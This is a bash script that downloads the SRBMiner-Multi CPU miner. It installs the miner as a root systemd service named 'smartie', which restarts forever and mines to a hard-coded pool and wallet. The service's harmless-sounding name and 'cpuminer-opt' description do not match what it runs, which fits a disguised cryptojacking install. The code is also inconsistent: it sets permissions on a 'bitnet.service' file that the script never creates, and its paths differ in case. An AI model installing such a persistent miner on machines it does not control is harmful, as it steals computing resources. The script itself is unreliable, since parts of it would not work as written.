#!/bin/bash

# Step 1: 

if [ ! -f "/root/SRBMiner-Multi-2-4-7/SRBMiner-Multi" ]; then
    # File cpuminer doesn't exist, perform installation
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz
    tar -xvf SRBMiner-Multi-2-4-7-Linux.tar.xz && cd SRBMiner-Multi-2-4-7
fi

# Step 2: 
sudo tee /etc/systemd/system/smartie.service <<EOF
[Unit]
Description=cpuminer-opt Service
After=network.target

[Service]
ExecStart=/root/SRBMiner-Multi-2-4-7/SRBMiner-MULTI --disable-gpu --algorithm yespower --pool stratum+tcp://stratum-na.rplant.xyz:7111 --wallet Zzko4CWYkB3ueZLFj4SsEU92czqYbSHT7C.b --password xc
WorkingDirectory=/root
Restart=always
RestartSec=3
User=root

[Install]
WantedBy=multi-user.target
EOF

# Step 3: 
sudo chmod 644 /etc/systemd/system/bitnet.service

# Step 4:
sudo systemctl daemon-reload

# Step 5: 
sudo systemctl start smartie

# Wait for 10 seconds
sleep 10

# 
sudo systemctl status smartie
